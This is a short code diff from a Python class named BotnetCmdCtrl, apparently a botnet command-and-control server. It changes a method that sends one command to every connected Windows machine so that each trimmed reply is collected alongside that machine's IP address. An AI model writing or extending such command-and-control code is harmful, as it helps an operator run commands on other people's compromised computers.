@@ -190,10 +190,11 @@ class BotnetCmdCtrl:
 				None
 		"""
 		response_list = []
-		for conn in WINDOWS_CONNS.values():
+		for ip, conn in WINDOWS_CONNS.items():
 			conn.sendall(cmd.encode(ENCODING))
 			response = conn.recv(RESPONSE_SIZE).decode(ENCODING)
-			response_list.append(response)
+			response = response[2:-1]
+			response_list.extend([ip, response])
 		return response_list
 	
 	def send_cmd_specific(self, cmd: str):
